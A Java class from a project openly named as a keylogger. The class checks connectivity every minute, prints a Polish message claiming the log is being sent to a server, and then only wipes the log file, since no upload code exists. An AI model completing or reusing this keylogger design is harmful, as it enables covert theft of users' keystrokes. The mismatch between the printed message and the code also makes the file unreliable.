package pl.keylogger;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;

public class InternetConnector implements Runnable {
    File logFile;
    PrintWriter printWriter;

    public InternetConnector(File logFile) {
        this.logFile = logFile;
    }

    public void run() {
        while(true) {
            try {
                Thread.sleep(60000);
                if (InetAddress.getByName("google.com").isReachable(5000)) {
                    System.out.println(">>Czyszczenie pliku i wysyłanie na serwer.");

                    synchronized (logFile) {
                        printWriter = new PrintWriter(new FileOutputStream(logFile, false));
                        printWriter.print("");
                        printWriter.close();
                    }
                } else {
                    System.out.println(">>Brak połączenia z serwerem");
                }
            } catch (Exception e) {
                System.out.println(">>Brak połączenia z serwerem");
            }
        }
    }
}
